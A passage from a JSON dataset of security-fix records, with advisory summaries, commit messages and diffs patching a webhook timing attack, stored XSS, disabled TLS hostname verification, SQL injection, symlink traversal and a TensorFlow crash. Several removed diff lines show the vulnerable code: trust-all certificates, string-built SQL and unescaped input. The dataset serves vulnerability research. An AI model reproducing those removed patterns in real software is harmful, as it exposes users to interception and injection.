pass'}}","message_norm":"security: prevent timing attack on webhook_authorization secret\n\nanymail's webhook validation was vulnerable to a timing attack.\nan attacker could have used this to recover your webhook_authorization\nshared secret, potentially allowing them to post fabricated or malicious\nemail tracking events to your app.\n\nthere have not been any reports of attempted exploit in the wild. (the\nvulnerability was discovered through code review.) attempts would be\nvisible in http logs as a very large number of 400 responses on\nanymail's webhook urls, or in python error monitoring as a very large\nnumber of anymailwebhookvalidationfailure exceptions.\n\nif you are using anymail's webhooks, you should upgrade to this release.\nin addition, you may want to rotate to a new webhook_authorization\nsecret ([docs](http:\/\/anymail.readthedocs.io\/en\/stable\/tips\/securing_webhooks\/#use-a-shared-authorization-secret)),\nparticularly if your logs indicate attempted exploit.","language":"en","entities":"[('security', 'SECWORD', ''), ('prevent', 'ACTION', ''), ('attack', 'SECWORD', ''), ('vulnerable', 'SECWORD', ''), ('attack', 'FLAW', ''), ('attacker', 'SECWORD', ''), ('malicious', 'SECWORD', ''), ('exploit', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('error', 'FLAW', ''), ('upgrade', 'ACTION', ''), ('docs](http:\/\/anymail.readthedocs.io', 'URL', ''), ('exploit', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['anymail\/webhooks\/base.py'])","num_files":1.0},{"index":2162,"vuln_id":"GHSA-hxf9-7h4c-f5jv","cwe_id":"{'CWE-200'}","score":9.1,"chain":"{'https:\/\/github.com\/anymail\/django-anymail\/commit\/db586ede1fbb41dce21310ea28ae15a1cf1286c5', 'https:\/\/github.com\/anymail\/django-anymail\/commit\/c07998304b4a31df4c61deddcb03d3607a04691b'}","dataset":"osv","summary":"Django-Anymail prone to a timing attack webhooks\/base.py in Anymail (aka django-anymail) before 1.2.1 is prone to a timing attack vulnerability on the WEBHOOK_AUTHORIZATION secret, which allows remote attackers to post arbitrary e-mail tracking events.","published_date":"2018-07-12","chain_len":2,"project":"https:\/\/github.com\/anymail\/django-anymail","commit_href":"https:\/\/github.com\/anymail\/django-anymail\/commit\/c07998304b4a31df4c61deddcb03d3607a04691b","commit_sha":"c07998304b4a31df4c61deddcb03d3607a04691b","patch":"MULTI","chain_ord":"['db586ede1fbb41dce21310ea28ae15a1cf1286c5', 'c07998304b4a31df4c61deddcb03d3607a04691b']","before_first_fix_commit":"{'7029298b930620b1655dab2548f72d6640a5905e'}","last_fix_commit":"c07998304b4a31df4c61deddcb03d3607a04691b","chain_ord_pos":2.0,"commit_datetime":"02\/02\/2018, 19:41:14","message":"Security: prevent timing attack on WEBHOOK_AUTHORIZATION secret\n\nAnymail's webhook validation was vulnerable to a timing attack.\nAn attacker could have used this to recover your WEBHOOK_AUTHORIZATION\nshared secret, potentially allowing them to post fabricated or malicious\nemail tracking events to your app.\n\nThere have not been any reports of attempted exploit in the wild. (The\nvulnerability was discovered through code review.) Attempts would be\nvisible in http logs as a very large number of 400 responses on\nAnymail's webhook urls, or in Python error monitoring as a very large\nnumber of AnymailWebhookValidationFailure exceptions.\n\nIf you are using Anymail's webhooks, you should upgrade to this release.\nIn addition, you may want to rotate to a new WEBHOOK_AUTHORIZATION\nsecret ([docs](http:\/\/anymail.readthedocs.io\/en\/stable\/tips\/securing_webhooks\/#use-a-shared-authorization-secret)),\nparticularly if your logs indicate attempted exploit.\n\n(cherry picked from commit db586ede1fbb41dce21310ea28ae15a1cf1286c5)","author":"medmunds","comments":null,"stats":"{'additions': 12, 'deletions': 3, 'total': 15}","files":"{'anymail\/webhooks\/base.py': {'additions': 12, 'deletions': 3, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/anymail\/django-anymail\/raw\/c07998304b4a31df4c61deddcb03d3607a04691b\/anymail%2Fwebhooks%2Fbase.py', 'patch': '@@ -3,6 +3,7 @@\\n \\n import six\\n from django.http import HttpResponse\\n+from django.utils.crypto import constant_time_compare\\n from django.utils.decorators import method_decorator\\n from django.views.decorators.csrf import csrf_exempt\\n from django.views.generic import View\\n@@ -41,8 +42,13 @@ def __init__(self, **kwargs):\\n     def validate_request(self, request):\\n         \"\"\"If configured for webhook basic auth, validate request has correct auth.\"\"\"\\n         if self.basic_auth:\\n-            basic_auth = get_request_basic_auth(request)\\n-            if basic_auth is None or basic_auth not in self.basic_auth:\\n+            request_auth = get_request_basic_auth(request)\\n+            # Use constant_time_compare to avoid timing attack on basic auth. (It\\'s OK that any()\\n+            # can terminate early: we\\'re not trying to protect how many auth strings are allowed,\\n+            # just the contents of each individual auth string.)\\n+            auth_ok = any(constant_time_compare(request_auth, allowed_auth)\\n+                          for allowed_auth in self.basic_auth)\\n+            if not auth_ok:\\n                 # noinspection PyUnresolvedReferences\\n                 raise AnymailWebhookValidationFailure(\\n                     \"Missing or invalid basic auth in Anymail %s webhook\" % self.esp_name)\\n@@ -78,8 +84,11 @@ def validate_request(self, request):\\n         *All* definitions of this method in the class chain (including mixins)\\n         will be called. There is no need to chain to the superclass.\\n         (See self.run_validators and collect_all_methods.)\\n+\\n+        Security note: use django.utils.crypto.constant_time_compare for string\\n+        comparisons, to avoid exposing your validation to a timing attack.\\n         \"\"\"\\n-        # if request.POST[\\'signature\\'] != expected_signature:\\n+        # if not constant_time_compare(request.POST[\\'signature\\'], expected_signature):\\n         #     raise AnymailWebhookValidationFailure(\"...message...\")\\n         # (else just do nothing)\\n         pass'}}","message_norm":"security: prevent timing attack on webhook_authorization secret\n\nanymail's webhook validation was vulnerable to a timing attack.\nan attacker could have used this to recover your webhook_authorization\nshared secret, potentially allowing them to post fabricated or malicious\nemail tracking events to your app.\n\nthere have not been any reports of attempted exploit in the wild. (the\nvulnerability was discovered through code review.) attempts would be\nvisible in http logs as a very large number of 400 responses on\nanymail's webhook urls, or in python error monitoring as a very large\nnumber of anymailwebhookvalidationfailure exceptions.\n\nif you are using anymail's webhooks, you should upgrade to this release.\nin addition, you may want to rotate to a new webhook_authorization\nsecret ([docs](http:\/\/anymail.readthedocs.io\/en\/stable\/tips\/securing_webhooks\/#use-a-shared-authorization-secret)),\nparticularly if your logs indicate attempted exploit.\n\n(cherry picked from commit db586ede1fbb41dce21310ea28ae15a1cf1286c5)","language":"en","entities":"[('security', 'SECWORD', ''), ('prevent', 'ACTION', ''), ('attack', 'SECWORD', ''), ('vulnerable', 'SECWORD', ''), ('attack', 'FLAW', ''), ('attacker', 'SECWORD', ''), ('malicious', 'SECWORD', ''), ('exploit', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('error', 'FLAW', ''), ('upgrade', 'ACTION', ''), ('docs](http:\/\/anymail.readthedocs.io', 'URL', ''), ('exploit', 'SECWORD', ''), ('commit db586ede1fbb41dce21310ea28ae15a1cf1286c5', 'SHA', 'prefix_colon_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['anymail\/webhooks\/base.py'])","num_files":1.0},{"index":2167,"vuln_id":"GHSA-hxmr-5gv9-6p8v","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/librenms\/librenms\/commit\/4f86915866703e2fcd1e34b3fc1181ec2ad78e54'}","dataset":"osv","summary":"Cross-site Scripting in librenms Cross-site Scripting (XSS) - Stored in Packagist librenms\/librenms prior to 22.2.0.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/librenms\/librenms","commit_href":"https:\/\/github.com\/librenms\/librenms\/commit\/4f86915866703e2fcd1e34b3fc1181ec2ad78e54","commit_sha":"4f86915866703e2fcd1e34b3fc1181ec2ad78e54","patch":"SINGLE","chain_ord":"['4f86915866703e2fcd1e34b3fc1181ec2ad78e54']","before_first_fix_commit":"{'3ac0de16b2767d4d4df25b89aa9439daf070b24c'}","last_fix_commit":"4f86915866703e2fcd1e34b3fc1181ec2ad78e54","chain_ord_pos":1.0,"commit_datetime":"02\/13\/2022, 18:07:37","message":"XSS fix, cont. (#13776)\n\nhttps:\/\/huntr.dev\/bounties\/13951f51-deed-4a3d-8275-52306cc5a87d\/","author":"PipoCanaja","comments":null,"stats":"{'additions': 3, 'deletions': 3, 'total': 6}","files":"{'includes\/html\/pages\/addhost.inc.php': {'additions': 3, 'deletions': 3, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/librenms\/librenms\/raw\/4f86915866703e2fcd1e34b3fc1181ec2ad78e54\/includes%2Fhtml%2Fpages%2Faddhost.inc.php', 'patch': \"@@ -45,9 +45,9 @@\\n             $snmpver = 'v2c';\\n             $additional = [\\n                 'snmp_disable' => 1,\\n-                'os'           => $_POST['os'] ? $_POST['os_id'] : 'ping',\\n-                'hardware'     => $_POST['hardware'],\\n-                'sysName'      => $_POST['sysName'],\\n+                'os'           => $_POST['os'] ? strip_tags($_POST['os_id']) : 'ping',\\n+                'hardware'     => strip_tags($_POST['hardware']),\\n+                'sysName'      => strip_tags($_POST['sysName']),\\n             ];\\n         } elseif ($_POST['snmpver'] === 'v2c' || $_POST['snmpver'] === 'v1') {\\n             if ($_POST['community']) {\"}}","message_norm":"xss fix, cont. (#13776)\n\nhttps:\/\/huntr.dev\/bounties\/13951f51-deed-4a3d-8275-52306cc5a87d\/","language":"ca","entities":"[('xss', 'SECWORD', ''), ('#13776', 'ISSUE', ''), ('https:\/\/huntr.dev\/bounties\/13951f51-deed-4a3d-8275-52306cc5a87d\/', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['includes\/html\/pages\/addhost.inc.php'])","num_files":1.0},{"index":2168,"vuln_id":"GHSA-hxp5-8pgq-mgv9","cwe_id":"{'CWE-295'}","score":5.9,"chain":"{'https:\/\/github.com\/apache\/calcite\/commit\/43eeafcbac29d02c72bd520c003cdfc571de2d15'}","dataset":"osv","summary":"Missing Authentication for Critical Function in Apache Calcite \"HttpUtils#getURLConnection method disables explicitly hostname verification for HTTPS connections making clients vulnerable to man-in-the-middle attacks. Calcite uses this method internally to connect with Druid and Splunk so information leakage may happen when using the respective Calcite adapters. The method itself is in a utility class so people may use it to create vulnerable HTTPS connections for other applications. From Apache Calcite 1.26 onwards, the hostname verification will be performed using the default JVM truststore.\"","published_date":"2021-04-22","chain_len":1,"project":"https:\/\/github.com\/apache\/calcite","commit_href":"https:\/\/github.com\/apache\/calcite\/commit\/43eeafcbac29d02c72bd520c003cdfc571de2d15","commit_sha":"43eeafcbac29d02c72bd520c003cdfc571de2d15","patch":"SINGLE","chain_ord":"['43eeafcbac29d02c72bd520c003cdfc571de2d15']","before_first_fix_commit":"{'ab19f98172848fe303a18173946c2def0b0d0312'}","last_fix_commit":"43eeafcbac29d02c72bd520c003cdfc571de2d15","chain_ord_pos":1.0,"commit_datetime":"09\/22\/2020, 21:42:06","message":"[CALCITE-4298] Avoid disabling hostname verification on HTTPS connections","author":"Stamatis Zampetakis","comments":null,"stats":"{'additions': 1, 'deletions': 16, 'total': 17}","files":"{'core\/src\/main\/java\/org\/apache\/calcite\/runtime\/HttpUtils.java': {'additions': 1, 'deletions': 16, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/calcite\/raw\/43eeafcbac29d02c72bd520c003cdfc571de2d15\/core%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fcalcite%2Fruntime%2FHttpUtils.java', 'patch': \"@@ -23,11 +23,9 @@\\n import java.io.Writer;\\n import java.net.HttpURLConnection;\\n import java.net.URL;\\n-import java.net.URLConnection;\\n import java.net.URLEncoder;\\n import java.nio.charset.StandardCharsets;\\n import java.util.Map;\\n-import javax.net.ssl.HttpsURLConnection;\\n \\n \/**\\n  * Utilities for connecting to REST services such as Splunk via HTTP.\\n@@ -37,20 +35,7 @@ private HttpUtils() {}\\n \\n   public static HttpURLConnection getURLConnection(String url)\\n       throws IOException {\\n-    URLConnection conn = new URL(url).openConnection();\\n-    final HttpURLConnection httpConn = (HttpURLConnection) conn;\\n-\\n-    \/\/ take care of https stuff - most of the time it's only needed to\\n-    \/\/ secure client\/server comm\\n-    \/\/ not to establish the identity of the server\\n-    if (httpConn instanceof HttpsURLConnection) {\\n-      HttpsURLConnection httpsConn = (HttpsURLConnection) httpConn;\\n-      httpsConn.setSSLSocketFactory(\\n-          TrustAllSslSocketFactory.createSSLSocketFactory());\\n-      httpsConn.setHostnameVerifier((arg0, arg1) -> true);\\n-    }\\n-\\n-    return httpConn;\\n+    return (HttpURLConnection) new URL(url).openConnection();\\n   }\\n \\n   public static void appendURLEncodedArgs(\"}}","message_norm":"[calcite-4298] avoid disabling hostname verification on https connections","language":"en","entities":"[('hostname', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/src\/main\/java\/org\/apache\/calcite\/runtime\/HttpUtils.java'])","num_files":1.0},{"index":2171,"vuln_id":"GHSA-j259-6c58-9m58","cwe_id":"{'CWE-20'}","score":9.3,"chain":"{'https:\/\/github.com\/loopbackio\/loopback-connector-postgresql\/commit\/d57406c6737692a3a106b58a35406290cddb23e5'}","dataset":"osv","summary":"loopback-connector-postgresql Vulnerable to Improper Sanitization of `contains` Filter Improper input validation on the `contains` LoopBack filter may allow for arbitrary SQL injection.\n\n### Impact\n\nWhen the extended filter property `contains` is permitted to be interpreted by the Postgres connector, it is possible to inject arbitrary SQL which may affect the confidentiality and integrity of data stored on the connected database.\n\nThis affects users who does any of the following:\n\n- Connect to the database via the DataSource with `allowExtendedProperties: true` setting OR\n- Uses the connector's CRUD methods directly OR\n- Uses the connector's other methods to interpret the LoopBack filter.\n\n### Patches\n\nPatch release `loopback-connector-postgresql@5.5.1` has been published of which resolves this issue.\n\n### Workarounds\n\nUsers who are unable to upgrade should do the following if applicable:\n\n- Remove `allowExtendedProperties: true` DataSource setting\n- Add `allowExtendedProperties: false` DataSource setting\n- When passing directly to the connector functions, manually sanitize the user input for the `contains` LoopBack filter beforehand.","published_date":"2022-08-11","chain_len":1,"project":"https:\/\/github.com\/loopbackio\/loopback-connector-postgresql","commit_href":"https:\/\/github.com\/loopbackio\/loopback-connector-postgresql\/commit\/d57406c6737692a3a106b58a35406290cddb23e5","commit_sha":"d57406c6737692a3a106b58a35406290cddb23e5","patch":"SINGLE","chain_ord":"['d57406c6737692a3a106b58a35406290cddb23e5']","before_first_fix_commit":"{'1a863f3df332f1732e8fec519f1d686561313a3e'}","last_fix_commit":"d57406c6737692a3a106b58a35406290cddb23e5","chain_ord_pos":1.0,"commit_datetime":"08\/04\/2022, 11:27:20","message":"fix: improve filter sanitisation\n\nAdd sanitisation of user-input for `contains` LoopBack filter which may allow for arbitrary SQL injection.\n\nSigned-off-by: Rifa Achrinza <25147899+achrinza@users.noreply.github.com>","author":"Rifa Achrinza","comments":null,"stats":"{'additions': 4, 'deletions': 3, 'total': 7}","files":"{'lib\/postgresql.js': {'additions': 4, 'deletions': 3, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/loopbackio\/loopback-connector-postgresql\/raw\/d57406c6737692a3a106b58a35406290cddb23e5\/lib%2Fpostgresql.js', 'patch': \"@@ -545,10 +545,11 @@ PostgreSQL.prototype.buildExpression = function(columnName, operator,\\n       return new ParameterizedSQL(columnName + regexOperator,\\n         [operatorValue.source]);\\n     case 'contains':\\n-      return new ParameterizedSQL(columnName + ' @> array[' + operatorValue.map((v) => `'${v}'`) + ']::'\\n-        + propertyDefinition.postgresql.dataType);\\n+      return new ParameterizedSQL(columnName + ' @> array[' + operatorValue.map(() => '?') + ']::'\\n+        + propertyDefinition.postgresql.dataType,\\n+        operatorValue);\\n     case 'match':\\n-      return new ParameterizedSQL(`to_tsvector(${columnName}) @@ to_tsquery('${operatorValue}')`);\\n+      return new ParameterizedSQL(`to_tsvector(${columnName}) @@ to_tsquery(?)`, [operatorValue]);\\n     default:\\n       \/\/ invoke the base implementation of `buildExpression`\\n       return this.invokeSuper('buildExpression', columnName, operator,\"}}","message_norm":"fix: improve filter sanitisation\n\nadd sanitisation of user-input for `contains` loopback filter which may allow for arbitrary sql injection.\n\nsigned-off-by: rifa achrinza <25147899+achrinza@users.noreply.github.com>","language":"en","entities":"[('fix', 'ACTION', ''), ('improve', 'ACTION', ''), ('sanitisation', 'SECWORD', ''), ('add', 'ACTION', ''), ('sanitisation', 'SECWORD', ''), ('sql injection', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/postgresql.js'])","num_files":1.0},{"index":2173,"vuln_id":"GHSA-j383-35pm-c5h4","cwe_id":"{'CWE-22'}","score":5.5,"chain":"{'https:\/\/github.com\/gruntjs\/grunt\/commit\/aad3d4521c3098fb255fb2db8f2e1d691a033665', 'https:\/\/github.com\/gruntjs\/grunt\/commit\/b0ec6e12426fc8d5720dee1702f6a67455c5986c'}","dataset":"osv","summary":"Path Traversal in Grunt Grunt prior to version 1.5.2 is vulnerable to path traversal.","published_date":"2022-04-13","chain_len":2,"project":"https:\/\/github.com\/gruntjs\/grunt","commit_href":"https:\/\/github.com\/gruntjs\/grunt\/commit\/b0ec6e12426fc8d5720dee1702f6a67455c5986c","commit_sha":"b0ec6e12426fc8d5720dee1702f6a67455c5986c","patch":"MULTI","chain_ord":"['aad3d4521c3098fb255fb2db8f2e1d691a033665', 'b0ec6e12426fc8d5720dee1702f6a67455c5986c']","before_first_fix_commit":"{'433f91b78df99d83daa6f56a5505ead743627c30', 'd5969eccf2493c2c579c55a617c70cab48dc12d3'}","last_fix_commit":"b0ec6e12426fc8d5720dee1702f6a67455c5986c","chain_ord_pos":2.0,"commit_datetime":"04\/12\/2022, 11:51:53","message":"Merge pull request #1743 from gruntjs\/cleanup-link\n\nClean up link handling","author":"Vlad Filippov","comments":null,"stats":"{'additions': 6, 'deletions': 6, 'total': 12}","files":"{'lib\/grunt\/file.js': {'additions': 6, 'deletions': 6, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gruntjs\/grunt\/raw\/b0ec6e12426fc8d5720dee1702f6a67455c5986c\/lib%2Fgrunt%2Ffile.js', 'patch': \"@@ -294,7 +294,12 @@ file.write = function(filepath, contents, options) {\\n \/\/ processing content, writing output.\\n \/\/ Handles symlinks by coping them as files or directories.\\n file.copy = function copy(srcpath, destpath, options) {\\n-  if (file._isSymbolicLink(srcpath)) {\\n+  if (file.isLink(destpath)) {\\n+    \/\/ in case destpath is a symlink, avoid following the symlink, instead overwrite it later\\n+    fs.unlinkSync(destpath);\\n+  }\\n+\\n+  if (file.isLink(srcpath)) {\\n     file._copySymbolicLink(srcpath, destpath);\\n   } else if (file.isDir(srcpath)) {\\n     \/\/ Copy a directory, recursively.\\n@@ -452,11 +457,6 @@ file.isPathCwd = function() {\\n   }\\n };\\n \\n-file._isSymbolicLink = function() {\\n-  var filepath = path.join.apply(path, arguments);\\n-  return fs.lstatSync(filepath).isSymbolicLink();\\n-};\\n-\\n file._copySymbolicLink = function(srcpath, destpath) {\\n   var destdir = path.join(destpath, '..');\\n   \/\/ Use the correct relative path for the symlink\"}}","message_norm":"merge pull request #1743 from gruntjs\/cleanup-link\n\nclean up link handling","language":"en","entities":"[('#1743', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/grunt\/file.js'])","num_files":1.0},{"index":2178,"vuln_id":"GHSA-j3mj-fhpq-qqjj","cwe_id":"{'CWE-617'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5b491cd5e41ad63735161cec9c2a568172c8b6a3'}","dataset":"osv","summary":"Reachable Assertion in Tensorflow ### Impact\nWhen decoding a tensor from protobuf, a TensorFlow process can encounter cases where a `CHECK` assertion is invalidated based on user controlled arguments, if the tensors have an invalid `dtype` and 0 elements or an invalid shape. This allows attackers to cause denial of services in TensorFlow processes.\n\n### Patches\nWe have patched the issue in GitHub commit [5b491cd5e41ad63735161cec9c2a568172c8b6a3](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5b491cd5e41ad63735161cec9c2a568172c8b6a3).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range. \n  \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5b491cd5e41ad63735161cec9c2a568172c8b6a3","commit_sha":"5b491cd5e41ad63735161cec9c2a568172c8b6a3","patch":"SINGLE","chain_ord":"['5b491cd5e41ad63735161cec9c2a568172c8b6a3']","before_first_fix_commit":"{'9f3eb61a8033efa4ef45b1f291ef67d5beef8b0e'}","last_fix_commit":"5b491cd5e41ad63735161cec9c2a568172c8b6a3","chain_ord_pos":1.0,"commit_datetime":"11\/08\/2021, 17:51:28","message":"Validate `proto.dtype()` before calling `set_dtype()`.\n\nThis prevents a `DCHECK`-fail when the proto contains an invalid dtype for a tensor shape with 0 elements or for an incomplete tensor shape.\n\nPiperOrigin-RevId: 408369083\nChange-Id: Ia21a3e3d62a90d642a4561f08f3b543e5ad00c46","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 9, 'deletions': 0, 'total': 9}","files":"{'tensorflow\/core\/framework\/tensor.cc': {'additions': 9, 'deletions': 0, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/5b491cd5e41ad63735161cec9c2a568172c8b6a3\/tensorflow%2Fcore%2Fframework%2Ftensor.cc', 'patch': '@@ -983,6 +983,15 @@ bool Tensor::FromProto(Allocator* a, const TensorProto& proto) {\\n                          dtype_error = true, dtype_error = true);\\n     }\\n     if (dtype_error || p == nullptr) return false;\\n+  } else {\\n+    \/\/ Handle the case of empty tensors (N = 0) or tensors with incomplete shape\\n+    \/\/ (N = -1). All other values of `shape.num_elements()` should be invalid by\\n+    \/\/ construction.\\n+    \/\/ Here, we just need to validate that the `proto.dtype()` value is valid.\\n+    bool dtype_error = false;\\n+    CASES_WITH_DEFAULT(proto.dtype(), break, dtype_error = true,\\n+                       dtype_error = true);\\n+    if (dtype_error) return false;\\n   }\\n   shape_ = shape;\\n   set_dtype(proto.dtype());'}}","message_norm":"validate `proto.dtype()` before calling `set_dtype()`.\n\nthis prevents a `dcheck`-fail when the proto contains an invalid dtype for a tensor shape with 0 elements or for an incomplete tensor shape.\n\npiperorigin-revid: 408369083\nchange-id: ia21a3e3d62a90d642a4561f08f3b543e5ad00c46","language":"en","entities":"[('validate', 'ACTION', ''), ('prevents', 'ACTION', ''), ('408369083', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/framework\/tensor.cc'])","num_files":1.0},{"index":2183,"vuln_id":"GHSA-j472-mcq2-95p6","cwe_id":"{'CWE-78'}","score":8.8,"chain":"{'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/67f68c181033cbabf2075769e0f846f58c226c08', 'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/d7ea3f40efedd50541a57b943d5f7bbed046d091'}","dataset":"osv","summary":"OS Command Injection in Jenkins Jenkins 2.73.1 and earlier, 2.83 and earlier users with permission to create or configure agents in Jenkins could configure a launch method called 'Launch agent via execution of command on master'. This allowed them to run arbitrary shell commands on the master node whenever the agent was supposed to be launched. Configuration of this launch method now requires the Run Scripts permission typically only granted to administrators.","published_date":"2022-05-14","chain_len":2,"project":"https:\/\/github.com\/jenkinsci\/jenkins","commit_href":"https:\/\/github.com\/jenkinsci\/jenkins\/commit\/67f68c181033cbabf2075769e0f846f58c226c08","commit_sha":"67f68c181033cbabf2075769e0f846f58c226c08","patch":"MULTI","chain_ord":"['d7ea3f40efedd50541a57b943d5f7bbed046d091', '67f68c181033cbabf2075769e0f846f58c226c08']","before_first_fix_commit":"{'3ff432ace14d8f4544c88a179a2f7a962eb98ba6'}","last_fix_commit":"67f68c181033cbabf2075769e0f846f58c226c08","chain_ord_pos":2.0,"commit_datetime":"09\/28\/2017, 15:37:47","message":"[SECURITY-478] Strengthening test.","author":"Jesse Glick","comments":null,"stats":"{'additions': 18, 'deletions': 1, 'total': 19}","files":"{'test\/src\/test\/java\/hudson\/slaves\/CommandLauncher2Test.java': {'additions': 18, 'deletions': 1, 'changes': 19, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/jenkins\/raw\/67f68c181033cbabf2075769e0f846f58c226c08\/test%2Fsrc%2Ftest%2Fjava%2Fhudson%2Fslaves%2FCommandLauncher2Test.java', 'patch': '@@ -29,15 +29,19 @@\\n import com.gargoylesoftware.htmlunit.WebRequest;\\n import com.gargoylesoftware.htmlunit.html.HtmlForm;\\n import com.gargoylesoftware.htmlunit.html.HtmlTextInput;\\n+import hudson.XmlFile;\\n import hudson.cli.CLICommand;\\n import hudson.cli.CLICommandInvoker;\\n import hudson.cli.UpdateNodeCommand;\\n import hudson.model.Computer;\\n import hudson.model.User;\\n+import java.io.File;\\n+import java.io.IOException;\\n import java.net.HttpURLConnection;\\n+import javax.annotation.CheckForNull;\\n import jenkins.model.Jenkins;\\n import org.apache.tools.ant.filters.StringInputStream;\\n-import static org.hamcrest.Matchers.containsString;\\n+import static org.hamcrest.Matchers.*;\\n import org.junit.Test;\\n import static org.junit.Assert.*;\\n import org.junit.Rule;\\n@@ -73,6 +77,7 @@ public void evaluate() throws Throwable {\\n                 rr.j.submit(form);\\n                 s = (DumbSlave) rr.j.jenkins.getNode(\"s\");\\n                 assertEquals(\"echo configured by GUI\", ((CommandLauncher) s.getLauncher()).getCommand());\\n+                assertSerialForm(s, \"echo configured by GUI\");\\n                 \/\/ Then by REST.\\n                 String configDotXml = s.toComputer().getUrl() + \"config.xml\";\\n                 String xml = wc.goTo(configDotXml, \"application\/xml\").getWebResponse().getContentAsString();\\n@@ -83,14 +88,17 @@ public void evaluate() throws Throwable {\\n                 wc.getPage(req);\\n                 s = (DumbSlave) rr.j.jenkins.getNode(\"s\");\\n                 assertEquals(\"echo configured by REST\", ((CommandLauncher) s.getLauncher()).getCommand());\\n+                assertSerialForm(s, \"echo configured by REST\");\\n                 \/\/ Then by CLI.\\n                 CLICommand cmd = new UpdateNodeCommand();\\n                 cmd.setTransportAuth(User.get(\"admin\").impersonate());\\n                 assertThat(new CLICommandInvoker(rr.j, cmd).withStdin(new StringInputStream(xml.replace(\"echo configured by GUI\", \"echo configured by CLI\"))).invokeWithArgs(\"s\"), CLICommandInvoker.Matcher.succeededSilently());\\n                 s = (DumbSlave) rr.j.jenkins.getNode(\"s\");\\n                 assertEquals(\"echo configured by CLI\", ((CommandLauncher) s.getLauncher()).getCommand());\\n+                assertSerialForm(s, \"echo configured by CLI\");\\n                 \/\/ Now verify that all modes failed as dev. First as GUI.\\n                 s.setLauncher(new CommandLauncher(\"echo configured by admin\"));\\n+                s.save();\\n                 wc = rr.j.createWebClient().login(\"dev\");\\n                 form = wc.getPage(s, \"configure\").getFormByName(\"config\");\\n                 input = form.getInputByName(\"_.command\");\\n@@ -104,6 +112,7 @@ public void evaluate() throws Throwable {\\n                 }\\n                 s = (DumbSlave) rr.j.jenkins.getNode(\"s\");\\n                 assertEquals(\"echo configured by admin\", ((CommandLauncher) s.getLauncher()).getCommand());\\n+                assertSerialForm(s, \"echo configured by admin\");\\n                 \/\/ Then by REST.\\n                 req = new WebRequest(wc.createCrumbedUrl(configDotXml), HttpMethod.POST);\\n                 req.setEncodingType(null);\\n@@ -115,6 +124,7 @@ public void evaluate() throws Throwable {\\n                 }\\n                 s = (DumbSlave) rr.j.jenkins.getNode(\"s\");\\n                 assertNotEquals(CommandLauncher.class, s.getLauncher().getClass()); \/\/ currently seems to reset it to JNLPLauncher, whatever\\n+                assertSerialForm(s, null);\\n                 s.setLauncher(new CommandLauncher(\"echo configured by admin\"));\\n                 \/\/ Then by CLI.\\n                 cmd = new UpdateNodeCommand();\\n@@ -123,10 +133,17 @@ public void evaluate() throws Throwable {\\n                     CLICommandInvoker.Matcher.\/* gets swallowed by RobustReflectionConverter, hmm*\/succeededSilently());\\n                 s = (DumbSlave) rr.j.jenkins.getNode(\"s\");\\n                 assertNotEquals(CommandLauncher.class, s.getLauncher().getClass());\\n+                assertSerialForm(s, null);\\n                 \/\/ Now also check that SYSTEM deserialization works after a restart.\\n                 s.setLauncher(new CommandLauncher(\"echo configured by admin\"));\\n                 s.save();\\n             }\\n+            private void assertSerialForm(DumbSlave s, @CheckForNull String expectedCommand) throws IOException {\\n+                \/\/ cf. private methods in Nodes\\n+                File nodesDir = new File(rr.j.jenkins.getRootDir(), \"nodes\");\\n+                XmlFile configXml = new XmlFile(Jenkins.XSTREAM, new File(new File(nodesDir, s.getNodeName()), \"config.xml\"));\\n+                assertThat(configXml.asString(), expectedCommand != null ? containsString(\"<agentCommand>\" + expectedCommand + \"<\/agentCommand>\") : not(containsString(\"<agentCommand>\")));\\n+            }\\n         });\\n         rr.addStep(new Statement() {\\n             @Override'}}","message_norm":"[security-478] strengthening test.","language":"en","entities":"[('security-478', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['test\/src\/test\/java\/hudson\/slaves\/CommandLauncher2Test.java'])","num_files":1.0},{"index":2185,"vuln_id":"GHSA-j47c-j42c-mwqq","cwe_id":"{'CWE-670'}","score":5.3,"chain":"{'https:\/\/github.com\/solana-labs\/solana-pay\/commit\/ac6ce0d0a81137700874a8bf5a7caac3be999fad'}","dataset":"osv","summary":"Solana Pay Vulnerable to Weakness in Transfer Validation Logic ### Description\nWhen a Solana Pay transaction is located using a [reference key](https:\/\/github.com\/solana-labs\/solana-pay\/blob\/master\/SPEC.md#reference), it may be checked to represent a transfer 